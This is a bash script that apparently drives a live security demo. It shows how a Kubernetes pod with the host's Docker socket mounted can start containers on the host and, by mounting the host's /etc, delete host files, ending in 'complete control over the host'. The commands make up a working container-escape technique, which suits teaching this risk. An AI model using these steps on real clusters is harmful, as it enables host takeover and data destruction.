#!/usr/bin/env bash

########################
# include the magic
########################
. lib/demo-magic.sh


########################
# Configure the options
########################

#
# speed at which to simulate typing. bigger num = faster
#
# TYPE_SPEED=20

#
# custom prompt
#
# see http://www.tldp.org/HOWTO/Bash-Prompt-HOWTO/bash-prompt-escape-sequences.html for escape sequences
#
DEMO_PROMPT="${GREEN}➜ ${CYAN}\W "

# hide the evidence
clear


# put your demo awesomeness here
#if [ ! -d "stuff" ]; then
#  pe "mkdir stuff"
#fi

#pe "cd stuff"

p "In this demo we are showing how to deploy a pod with access to the underlying docker socket"
pe "vim dind/dind-no-privs.yaml"
pe "kubectl apply -f dind/dind-no-privs.yaml"
pe "kubectl exec dind-no-privs -- id"
pe "kubectl exec dind-no-privs -- ls -al /var/run/docker.sock"
p "with this setup this way I can run docker build commands and push images to repositories etc."
pe "kubectl exec dind-no-privs -- docker run --name=nginx -d nginx:stable"
p "we can see this container running on the underlying host"
pe "docker ps -f name=nginx"
pe "docker stop nginx"
pe "docker rm nginx"
p "what else can we do?"
pe "hostname"
pe "sudo touch /etc/flag"
pe "kubectl exec dind-no-privs -- docker run --rm -v /etc:/host/etc bash:5 rm host/etc/flag"
pe "ls -al /etc/flag"
p "we have complete control over the host"

# show a prompt so as not to reveal our true nature after
# the demo has concluded
p ""
